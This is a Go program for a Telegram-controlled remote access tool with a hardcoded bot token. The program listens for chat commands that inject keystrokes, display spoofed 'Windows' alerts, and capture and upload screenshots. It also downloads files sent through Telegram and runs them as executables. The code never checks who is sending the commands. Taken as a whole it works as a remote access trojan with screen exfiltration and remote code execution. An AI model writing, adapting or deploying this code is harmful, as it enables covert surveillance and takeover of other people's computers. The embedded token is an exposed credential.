package main

import (
    "bytes"
    "fmt"
    "image/png"
    "io"
    "log"
    "net/http"
    "os"
    "os/exec"
    "strings"
    "github.com/gen2brain/beeep"
    "github.com/go-telegram-bot-api/telegram-bot-api"
    "github.com/go-vgo/robotgo"
)

var bot *tgbotapi.BotAPI

// Default token
const defaultToken = "7067270476:AAHEsH5V4B63ZTRjQWvT4icFAcDFNWH51Ag"

func main() {
    // Load the API token from the database or default token
    token := defaultToken // Replace with loadApiToken logic as needed

    // Create a new Telegram bot
    var err error
    bot, err = tgbotapi.NewBotAPI(token)
    if err != nil {
        log.Fatalf("Error creating Telegram bot: %v", err)
    }

    // Set the bot to debug mode
    bot.Debug = true
    log.Printf("Authorized on account %s", bot.Self.UserName)

    // Set up an update listener
    u := tgbotapi.NewUpdate(0)
    u.Timeout = 60
    updates, err := bot.GetUpdatesChan(u)

    // Listen for incoming updates (messages)
    for update := range updates {
        if update.Message == nil {
            continue
        }

        log.Printf("[%s] %s", update.Message.From.UserName, update.Message.Text)

        // Handle commands
        if strings.Contains(update.Message.Text, "===") {
            // Split the message into separate commands
            commands := strings.Split(update.Message.Text, "===")

            // Loop through each command and process it
            for _, command := range commands {
                command = strings.TrimSpace(command) // Remove any surrounding whitespace
                handleCommand(command, update.Message.Chat.ID)
            }
        } else {
            // Handle single command
            handleCommand(update.Message.Text, update.Message.Chat.ID)
        }

        // Handle file downloads
        if update.Message.Document != nil {
            handleFileDownload(update.Message.Document, update.Message.Chat.ID)
        }
    }
}

// handleCommand processes a single command
func handleAlertCommand(commandText string, chatID int64) {
    // Display system alert
    err := beeep.Notify("Windows", commandText, "")
    if err != nil {
        log.Printf("Error sending alert: %v", err)
        msg := tgbotapi.NewMessage(chatID, "Failed to send alert.")
        bot.Send(msg)
        return
    }

    // Send a message to the Telegram user
    msg := tgbotapi.NewMessage(chatID, fmt.Sprintf("Alert displayed: %s", commandText))
    bot.Send(msg)
}

// handleCommand processes a single command
func handleCommand(command string, chatID int64) {
    switch {
    case strings.HasPrefix(command, "/type_"):
        handleTypeCommand(command[6:], chatID)
    case strings.HasPrefix(command, "/press_"):
        handlePressCommand(command[7:], chatID)
    case strings.HasPrefix(command, "/run_"):
        handleRunCommand(command[5:], chatID)
    case strings.HasPrefix(command, "/alert_"):
        handleAlertCommand(command[7:], chatID) // Call alert handler for /alert_<text>
    case command == "/screen":
        handleScreenCommand(chatID)
    case command == "/help":
        sendHelpMessage(chatID)
    default:
        // Respond with default message
        msg := tgbotapi.NewMessage(chatID, "I don't understand this command. Type /help for available commands.")
        bot.Send(msg)
    }
}

// sendHelpMessage sends a list of available commands
func sendHelpMessage(chatID int64) {
    helpMessage := `
Available commands:
1. /type_text - Type the given text on the screen.
2. /press_key - Simulate a key press.
3. /run_URL - Run an executable in the same directory.
4. /screen - Capture a screenshot of the screen.
5. /help - Show this help message.
6. Send a file to upload. 
7. /alert_text
`
    msg := tgbotapi.NewMessage(chatID, helpMessage)
    bot.Send(msg)
}

// handleTypeCommand simulates typing text using robotgo
func handleTypeCommand(commandText string, chatID int64) {
    robotgo.TypeStr(commandText)
    msg := tgbotapi.NewMessage(chatID, "Typed: "+commandText)
    bot.Send(msg)
}

// handlePressCommand simulates keypresses using robotgo
func handlePressCommand(commandText string, chatID int64) {
    robotgo.KeyTap(commandText)
    msg := tgbotapi.NewMessage(chatID, "Pressed key: "+commandText)
    bot.Send(msg)
}

func handleRunCommand(commandText string, chatID int64) {
    // Build the file path (assuming the file is in the downloads folder)
    filePath := fmt.Sprintf("./downloads/%s", commandText)

    // Check if the file exists
    if _, err := os.Stat(filePath); err != nil {
        msg := tgbotapi.NewMessage(chatID, "Error: File not found.")
        bot.Send(msg)
        return
    }

    // Check if the file is an HTML file
    if strings.HasSuffix(filePath, ".html") {
        var cmd *exec.Cmd
        if isLinux() {
            // Linux: xdg-open opens the file in the default browser
            cmd = exec.Command("xdg-open", filePath)
        } else if isWindows() {
            // Windows: cmd /C start opens the file with the default browser
            cmd = exec.Command("cmd", "/C", "start", filePath)
        } else if isMac() {
            // macOS: open opens the file in the default browser
            cmd = exec.Command("open", filePath)
        }

        // Start the command and check for errors
        err := cmd.Start()
        if err != nil {
            // Print the error message for debugging
            log.Printf("Error starting the command: %v", err)
            msg := tgbotapi.NewMessage(chatID, "Error: Could not open the HTML file in the browser.")
            bot.Send(msg)
            return
        }

        // Success message
        msg := tgbotapi.NewMessage(chatID, fmt.Sprintf("Opening HTML file: %s", filePath))
        bot.Send(msg)
    } else {
        // If not an HTML file, try running it as an executable
        cmd := exec.Command(filePath)
        err := cmd.Start()
        if err != nil {
            log.Printf("Error running the file: %v", err)
            msg := tgbotapi.NewMessage(chatID, "Error: Could not run the app.")
            bot.Send(msg)
            return
        }

        // Success message
        msg := tgbotapi.NewMessage(chatID, fmt.Sprintf("Running: %s", filePath))
        bot.Send(msg)
    }
}

// Utility functions to detect the platform
func isLinux() bool {
    return strings.Contains(strings.ToLower(os.Getenv("GOOS")), "linux")
}

func isWindows() bool {
    return strings.Contains(strings.ToLower(os.Getenv("GOOS")), "windows")
}

func isMac() bool {
    return strings.Contains(strings.ToLower(os.Getenv("GOOS")), "darwin")
}

// handleScreenCommand captures and sends a screenshot of the screen
func handleScreenCommand(chatID int64) {
    // Capture the screen size
    screenWidth, screenHeight := robotgo.GetScreenSize()

    // Capture the screen (x, y, width, height)
    screenCapture := robotgo.CaptureScreen(0, 0, screenWidth, screenHeight)

    // Convert the captured screen (CBitmap) to an image
    img := robotgo.ToImage(screenCapture)

    // Encode the image as PNG
    var buf bytes.Buffer
    err := png.Encode(&buf, img)
    if err != nil {
        log.Println("Error encoding screenshot:", err)
        msg := tgbotapi.NewMessage(chatID, "Failed to encode screenshot.")
        bot.Send(msg)
        return
    }

    // Send the screenshot as a photo to Telegram
    file := tgbotapi.FileBytes{
        Name:  "screenshot.png",
        Bytes: buf.Bytes(),
    }
    msg := tgbotapi.NewPhotoUpload(chatID, file)
    _, err = bot.Send(msg)
    if err != nil {
        log.Println("Error sending screenshot:", err)
    }
}

// handleFileDownload downloads the file from Telegram to the current folder
func handleFileDownload(document *tgbotapi.Document, chatID int64) {
    // Get the file info from Telegram
    file, err := bot.GetFile(tgbotapi.FileConfig{FileID: document.FileID})
    if err != nil {
        log.Printf("Error getting file: %v", err)
        return
    }

    // Construct the file URL
    fileURL := fmt.Sprintf("https://api.telegram.org/file/bot%s/%s", bot.Token, file.FilePath)

    // Create the directory to store the downloaded file if it doesn't exist
    err = os.MkdirAll("./downloads", 0755)
    if err != nil {
        log.Printf("Error creating download folder: %v", err)
        return
    }

    // Get the original file name from the Document object
    originalFileName := document.FileName
    if originalFileName == "" {
        originalFileName = "downloaded_file" // Fallback if no name is provided
    }

    // Download the file from the constructed URL
    resp, err := http.Get(fileURL)
    if err != nil {
        log.Printf("Error downloading file: %v", err)
        return
    }
    defer resp.Body.Close()

    // Create the file where the downloaded content will be saved
    outFile, err := os.Create(fmt.Sprintf("./downloads/%s", originalFileName))
    if err != nil {
        log.Printf("Error creating output file: %v", err)
        return
    }
    defer outFile.Close()

    // Copy the response body (file data) into the output file
    _, err = io.Copy(outFile, resp.Body)
    if err != nil {
        log.Printf("Error writing file: %v", err)
        return
    }

    // Notify the user that the file has been downloaded
    msg := tgbotapi.NewMessage(chatID, fmt.Sprintf("File '%s' downloaded successfully.", originalFileName))
    bot.Send(msg)
}
